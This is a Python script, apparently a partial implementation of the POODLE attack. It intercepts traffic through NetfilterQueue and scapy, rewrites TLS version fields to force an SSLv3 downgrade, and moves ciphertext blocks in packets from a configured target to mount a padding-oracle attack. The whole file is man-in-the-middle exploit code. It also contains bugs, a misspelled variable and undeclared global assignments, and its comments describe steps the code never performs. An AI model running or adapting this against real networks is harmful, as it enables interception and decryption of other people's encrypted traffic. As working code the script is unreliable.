#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import threading
import json
from enum import Enum

SSL_V3_CODE = 768

Stage = Enum('Stage', 'downgrade_dance block_length exploit')
stage = Stage.downgrade_dance

block_size = 128 # Assuming AES to start

# for block_length stage
ciphertext_length = 0

# For exploit stage
block_to_move = 2


load_layer('tls')

config = json.load(open('config.json'))

def copy_block(arr, copy_index, target_index):
	arr[target_index:(target_index+block_size)] = arr[copy_index:(copy_index+bblock_size)]
	return arr

def callback(packet):

	# If packet is going to target and packet is http, change packet to inject javascript (initially only once)
	# If block length unknown and TLS data packet is going from client to server, track lengths until we get block length
	# If block length known:
		# If packet is DNS to client, and gives IP of SSL site, keep track of IP of SSL site (optional, only if using name for site)
		# If packet is from server to client, and is TLS handshake, and is TLS version > SSLv3, change to handshake fail
		# If packet is TLS data packet from client to server, copy block to end
	


	pkt = IP(packet.get_payload())

	print(pkt.src + " -> " + pkt.dst)
	print(pkt[0].summary())
	if pkt.haslayer(TLS) and pkt.getlayer(TLS).version > SSL_V3_CODE and stage == Stage.downgrade_dance and pkt.src != config['target']:
		print("Downgrading server packet")
		pkt.getlayer(TLS).version = SSL_V3_CODE
		packet.set_payload(bytes(pkt))
		packet.accept()
		return

	if pkt.src == config['target'] and stage == Stage.exploit:
		start_index = block_size * block_to_move
		last_block_index = len(pkt) - block_size
		packet.set_payload(bytes(copy_block(list(packet.get_payload()), start_index, last_block_index)))
		packet.accept()
		return
	elif pkt.src == config['target'] and stage == Stage.block_length:
		if ciphertext_length > 0:
			if len(pkt) > ciphertext_length:
				block_size = len(pkt) - ciphertext_length
		else:
			ciphertext_length = len(pkt)
		packet.drop()
		return
		
	if (pkt.dst == '192.168.1.160'):
		pass
		#print(pkt)
		#print(pkt[0].show())

	#print(pkt[TCP].payload)
	#packet.set_payload(str(pkt))
	packet.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback)

try:
	nfqueue.run()
except KeyboardInterrupt:
	pass

nfqueue.unbind()
